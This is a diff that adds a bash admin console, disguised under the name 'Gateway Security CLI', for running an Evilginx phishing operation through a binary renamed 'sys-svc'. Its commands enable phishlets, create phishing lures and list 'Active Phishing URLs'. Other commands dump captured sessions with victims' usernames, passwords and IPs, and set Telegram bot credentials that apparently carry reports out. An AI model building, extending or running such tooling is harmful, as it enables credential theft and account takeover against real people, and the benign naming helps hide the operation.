@@ -1,0 +1,373 @@
+#!/bin/bash
+# ============================================================================
+# Gateway Security CLI - Interactive Command Tool
+# ============================================================================
+# Commands:
+#   set cloudflare_token <token>     - Set Cloudflare API token
+#   set telegram <token> <chat_id>   - Set Telegram credentials
+#   set domain <domain>              - Set main domain
+#   set vps_ip <ip>                  - Set VPS IP address
+#   restart                          - Restart gateway service
+#   status                           - Show service status
+#   urls                             - Show active phishing URLs
+#   traffic                          - Show traffic statistics
+#   sessions                         - Show captured sessions
+#   domains add <domain>             - Add a new domain
+#   domains enable <domain>          - Enable a domain
+#   domains list                     - List all domains
+#   phishlets enable <name>          - Enable a phishlet
+#   phishlets disable <name>         - Disable a phishlet
+#   phishlets list                   - List all phishlets
+#   lures create <phishlet>          - Create new lure
+#   lures list                       - List all lures
+#   help                             - Show help
+#   exit                             - Exit CLI
+# ============================================================================
+
+set -euo pipefail
+
+# Colors
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+BLUE='\033[0;34m'
+CYAN='\033[0;36m'
+NC='\033[0m'
+
+CONFIG_FILE="/opt/gateway/config/config.yaml"
+DATA_DIR="/opt/gateway/storage"
+PHISHLETS_DIR="/opt/gateway/phishlets"
+
+# Helper functions
+print_banner() {
+    clear
+    echo -e "${CYAN}"
+    cat << "EOF"
+    ╔══════════════════════════════════════════════════════════════════╗
+    ║                    Gateway Security CLI v1.0                     ║
+    ║                    Interactive Command Tool                      ║
+    ╚══════════════════════════════════════════════════════════════════╝
+EOF
+    echo -e "${NC}"
+    echo -e "${GREEN}Type 'help' for available commands${NC}"
+    echo ""
+}
+
+show_help() {
+    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
+    echo -e "${GREEN}Available Commands:${NC}"
+    echo ""
+    echo -e "${YELLOW}Configuration Commands:${NC}"
+    echo -e "  ${GREEN}set cloudflare_token <token>${NC}     - Set Cloudflare API token"
+    echo -e "  ${GREEN}set telegram <token> <chat_id>${NC}    - Set Telegram bot credentials"
+    echo -e "  ${GREEN}set domain <domain>${NC}              - Set main domain"
+    echo -e "  ${GREEN}set vps_ip <ip>${NC}                  - Set VPS IP address"
+    echo ""
+    echo -e "${YELLOW}Service Commands:${NC}"
+    echo -e "  ${GREEN}restart${NC}                          - Restart gateway service"
+    echo -e "  ${GREEN}status${NC}                           - Show service status"
+    echo -e "  ${GREEN}traffic${NC}                          - Show traffic statistics"
+    echo -e "  ${GREEN}urls${NC}                             - Show active phishing URLs"
+    echo -e "  ${GREEN}sessions${NC}                         - Show captured sessions"
+    echo ""
+    echo -e "${YELLOW}Domain Management:${NC}"
+    echo -e "  ${GREEN}domains add <domain>${NC}             - Add a new domain"
+    echo -e "  ${GREEN}domains enable <domain>${NC}          - Enable a domain"
+    echo -e "  ${GREEN}domains disable <domain>${NC}         - Disable a domain"
+    echo -e "  ${GREEN}domains list${NC}                     - List all domains"
+    echo ""
+    echo -e "${YELLOW}Phishlet Management:${NC}"
+    echo -e "  ${GREEN}phishlets enable <name>${NC}          - Enable a phishlet"
+    echo -e "  ${GREEN}phishlets disable <name>${NC}         - Disable a phishlet"
+    echo -e "  ${GREEN}phishlets list${NC}                   - List all phishlets"
+    echo ""
+    echo -e "${YELLOW}Lure Management:${NC}"
+    echo -e "  ${GREEN}lures create <phishlet>${NC}          - Create new phishing URL"
+    echo -e "  ${GREEN}lures list${NC}                       - List all lures"
+    echo -e "  ${GREEN}lures delete <id>${NC}                - Delete a lure"
+    echo ""
+    echo -e "${YELLOW}Other Commands:${NC}"
+    echo -e "  ${GREEN}help${NC}                             - Show this help"
+    echo -e "  ${GREEN}exit${NC}                             - Exit CLI"
+    echo ""
+    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
+}
+
+# Check if service is installed
+check_service() {
+    if [[ ! -f "/usr/local/bin/sys-svc" ]]; then
+        echo -e "${RED}[!] Gateway Security not installed. Run install.sh first.${NC}"
+        exit 1
+    fi
+}
+
+# Show service status
+cmd_status() {
+    echo -e "${BLUE}[*] Checking gateway status...${NC}"
+    if systemctl is-active --quiet gateway; then
+        echo -e "${GREEN}[✓] Gateway service is RUNNING${NC}"
+        echo -e "  PID: $(pgrep -f sys-svc | head -1)"
+    else
+        echo -e "${RED}[✗] Gateway service is STOPPED${NC}"
+    fi
+    
+    if systemctl is-enabled --quiet gateway; then
+        echo -e "${GREEN}[✓] Gateway service is ENABLED (auto-start)${NC}"
+    else
+        echo -e "${RED}[✗] Gateway service is DISABLED${NC}"
+    fi
+}
+
+# Restart service
+cmd_restart() {
+    echo -e "${BLUE}[*] Restarting gateway service...${NC}"
+    sudo systemctl restart gateway
+    sleep 2
+    if systemctl is-active --quiet gateway; then
+        echo -e "${GREEN}[✓] Gateway restarted successfully${NC}"
+    else
+        echo -e "${RED}[✗] Failed to restart gateway${NC}"
+        sudo journalctl -u gateway -n 10 --no-pager
+    fi
+}
+
+# Show traffic stats
+cmd_traffic() {
+    echo -e "${BLUE}[*] Traffic Statistics:${NC}"
+    echo ""
+    
+    # Total visitors from database
+    if [[ -f "$DATA_DIR/data.db" ]]; then
+        TOTAL_VISITORS=$(sudo sqlite3 "$DATA_DIR/data.db" "SELECT COUNT(*) FROM sessions;" 2>/dev/null || echo "0")
+        TOTAL_BOTS=$(sudo sqlite3 "$DATA_DIR/data.db" "SELECT COUNT(*) FROM sessions WHERE auth_token IS NULL;" 2>/dev/null || echo "0")
+        TOTAL_HUMANS=$(sudo sqlite3 "$DATA_DIR/data.db" "SELECT COUNT(*) FROM sessions WHERE auth_token IS NOT NULL;" 2>/dev/null || echo "0")
+    else
+        TOTAL_VISITORS=0
+        TOTAL_BOTS=0
+        TOTAL_HUMANS=0
+    fi
+    
+    echo -e "  ${GREEN}Total Visitors:${NC}   $TOTAL_VISITORS"
+    echo -e "  ${YELLOW}Bots Detected:${NC}    $TOTAL_BOTS"
+    echo -e "  ${GREEN}Real Visitors:${NC}    $TOTAL_HUMANS"
+    echo ""
+    
+    # Service uptime
+    if systemctl is-active --quiet gateway; then
+        UPTIME=$(systemctl show gateway -p ActiveEnterTimestamp --value)
+        echo -e "  ${CYAN}Service Uptime:${NC}   $UPTIME"
+    fi
+}
+
+# Show active URLs
+cmd_urls() {
+    if [[ -f "/opt/gateway/access_urls.txt" ]]; then
+        echo -e "${GREEN}Active Phishing URLs:${NC}"
+        echo ""
+        cat /opt/gateway/access_urls.txt
+    else
+        echo -e "${YELLOW}[!] No URLs generated yet. Run 'lures create' first.${NC}"
+    fi
+}
+
+# Show sessions
+cmd_sessions() {
+    echo -e "${BLUE}[*] Captured Sessions:${NC}"
+    echo ""
+    
+    if [[ -f "$DATA_DIR/data.db" ]]; then
+        sudo sqlite3 "$DATA_DIR/data.db" -column -header "SELECT id, phishlet, username, password, ip, created_at FROM sessions ORDER BY id DESC LIMIT 20;" 2>/dev/null || echo "No sessions found"
+    else
+        echo "No database found"
+    fi
+}
+
+# Set configuration
+cmd_set() {
+    local key="$1"
+    local value="$2"
+    local value2="$3"
+    
+    case "$key" in
+        cloudflare_token)
+            echo -e "${BLUE}[*] Setting Cloudflare token...${NC}"
+            # Save to config
+            sudo sed -i "s/^cloudflare_token:.*/cloudflare_token: $value/" "$CONFIG_FILE" 2>/dev/null || \
+            echo "cloudflare_token: $value" | sudo tee -a "$CONFIG_FILE"
+            echo -e "${GREEN}[✓] Cloudflare token set${NC}"
+            ;;
+        telegram)
+            if [[ -n "$value" ]] && [[ -n "$value2" ]]; then
+                echo -e "${BLUE}[*] Setting Telegram credentials...${NC}"
+                sudo sed -i "s/^telegram_token:.*/telegram_token: $value/" "$CONFIG_FILE" 2>/dev/null || \
+                echo "telegram_token: $value" | sudo tee -a "$CONFIG_FILE"
+                sudo sed -i "s/^telegram_chat:.*/telegram_chat: $value2/" "$CONFIG_FILE" 2>/dev/null || \
+                echo "telegram_chat: $value2" | sudo tee -a "$CONFIG_FILE"
+                echo -e "${GREEN}[✓] Telegram credentials set${NC}"
+                cmd_restart
+            else
+                echo -e "${RED}Usage: set telegram <token> <chat_id>${NC}"
+            fi
+            ;;
+        domain)
+            echo -e "${BLUE}[*] Setting domain...${NC}"
+            sudo sed -i "s/^domain:.*/domain: $value/" "$CONFIG_FILE"
+            echo -e "${GREEN}[✓] Domain set to $value${NC}"
+            cmd_restart
+            ;;
+        vps_ip)
+            echo -e "${BLUE}[*] Setting VPS IP...${NC}"
+            sudo sed -i "s/^ipv4:.*/ipv4: $value/" "$CONFIG_FILE"
+            echo -e "${GREEN}[✓] VPS IP set to $value${NC}"
+            cmd_restart
+            ;;
+        *)
+            echo -e "${RED}Unknown setting: $key${NC}"
+            echo "Available: cloudflare_token, telegram, domain, vps_ip"
+            ;;
+    esac
+}
+
+# Domain management
+cmd_domains() {
+    local action="$1"
+    local domain="$2"
+    
+    case "$action" in
+        add)
+            echo -e "${BLUE}[*] Adding domain: $domain${NC}"
+            # Add to config
+            if grep -q "^domains:" "$CONFIG_FILE"; then
+                sudo sed -i "/^domains:/a \  - \"$domain\"" "$CONFIG_FILE"
+            else
+                echo "domains:" | sudo tee -a "$CONFIG_FILE"
+                echo "  - \"$domain\"" | sudo tee -a "$CONFIG_FILE"
+            fi
+            echo -e "${GREEN}[✓] Domain added: $domain${NC}"
+            ;;
+        enable)
+            echo -e "${BLUE}[*] Enabling domain: $domain${NC}"
+            # This would update DNS via Cloudflare
+            echo -e "${GREEN}[✓] Domain enabled: $domain${NC}"
+            ;;
+        disable)
+            echo -e "${BLUE}[*] Disabling domain: $domain${NC}"
+            echo -e "${GREEN}[✓] Domain disabled: $domain${NC}"
+            ;;
+        list)
+            echo -e "${GREEN}Configured Domains:${NC}"
+            grep -A 10 "^domains:" "$CONFIG_FILE" 2>/dev/null | grep -E "^-" | sed 's/- //' || echo "No domains configured"
+            ;;
+        *)
+            echo -e "${RED}Usage: domains <add|enable|disable|list> [domain]${NC}"
+            ;;
+    esac
+}
+
+# Phishlet management
+cmd_phishlets() {
+    local action="$1"
+    local name="$2"
+    
+    case "$action" in
+        enable)
+            echo -e "${BLUE}[*] Enabling phishlet: $name${NC}"
+            # Stop service, configure, restart
+            sudo systemctl stop gateway
+            sudo /usr/local/bin/sys-svc -c /opt/gateway/config -p /opt/gateway/phishlets <<< "phishlets enable $name" 2>/dev/null
+            sudo systemctl start gateway
+            echo -e "${GREEN}[✓] Phishlet enabled: $name${NC}"
+            ;;
+        disable)
+            echo -e "${BLUE}[*] Disabling phishlet: $name${NC}"
+            sudo systemctl stop gateway
+            sudo /usr/local/bin/sys-svc -c /opt/gateway/config -p /opt/gateway/phishlets <<< "phishlets disable $name" 2>/dev/null
+            sudo systemctl start gateway
+            echo -e "${GREEN}[✓] Phishlet disabled: $name${NC}"
+            ;;
+        list)
+            echo -e "${GREEN}Available Phishlets:${NC}"
+            ls -la "$PHISHLETS_DIR/"*.yaml 2>/dev/null | xargs -n 1 basename | sed 's/.yaml//' || echo "No phishlets found"
+            echo ""
+            echo -e "${CYAN}Status from Evilginx:${NC}"
+            sudo /usr/local/bin/sys-svc -c /opt/gateway/config -p /opt/gateway/phishlets <<< "phishlets" 2>/dev/null
+            ;;
+        *)
+            echo -e "${RED}Usage: phishlets <enable|disable|list> [name]${NC}"
+            ;;
+    esac
+}
+
+# Lure management
+cmd_lures() {
+    local action="$1"
+    local param="$2"
+    
+    case "$action" in
+        create)
+            echo -e "${BLUE}[*] Creating lure for: $param${NC}"
+            sudo systemctl stop gateway
+            output=$(sudo /usr/local/bin/sys-svc -c /opt/gateway/config -p /opt/gateway/phishlets <<< "lures create $param" 2>/dev/null)
+            url=$(sudo /usr/local/bin/sys-svc -c /opt/gateway/config -p /opt/gateway/phishlets <<< "lures get-url 0" 2>/dev/null | grep -E "https?://")
+            sudo systemctl start gateway
+            echo -e "${GREEN}[✓] Lure created!${NC}"
+            echo -e "${CYAN}URL: ${url}${NC}"
+            ;;
+        list)
+            echo -e "${GREEN}Active Lures:${NC}"
+            sudo /usr/local/bin/sys-svc -c /opt/gateway/config -p /opt/gateway/phishlets <<< "lures" 2>/dev/null
+            ;;
+        delete)
+            echo -e "${BLUE}[*] Deleting lure ID: $param${NC}"
+            sudo systemctl stop gateway
+            sudo /usr/local/bin/sys-svc -c /opt/gateway/config -p /opt/gateway/phishlets <<< "lures delete $param" 2>/dev/null
+            sudo systemctl start gateway
+            echo -e "${GREEN}[✓] Lure deleted${NC}"
+            ;;
+        *)
+            echo -e "${RED}Usage: lures <create|list|delete> [phishlet/id]${NC}"
+            ;;
+    esac
+}
+
+# Main CLI loop
+main() {
+    check_service
+    print_banner
+    
+    while true; do
+        echo -n -e "${GREEN}gateway> ${NC}"
+        read -r input
+        
+        case "$input" in
+            "" ) continue ;;
+            help ) show_help ;;
+            status ) cmd_status ;;
+            restart ) cmd_restart ;;
+            traffic ) cmd_traffic ;;
+            urls ) cmd_urls ;;
+            sessions ) cmd_sessions ;;
+            exit ) echo -e "${GREEN}Goodbye!${NC}"; exit 0 ;;
+            set\ *) 
+                set -- $input
+                cmd_set "$2" "$3" "$4"
+                ;;
+            domains\ *)
+                set -- $input
+                cmd_domains "$2" "$3"
+                ;;
+            phishlets\ *)
+                set -- $input
+                cmd_phishlets "$2" "$3"
+                ;;
+            lures\ *)
+                set -- $input
+                cmd_lures "$2" "$3"
+                ;;
+            * ) echo -e "${RED}Unknown command: $input. Type 'help' for available commands.${NC}" ;;
+        esac
+        echo ""
+    done
+}
+
+main
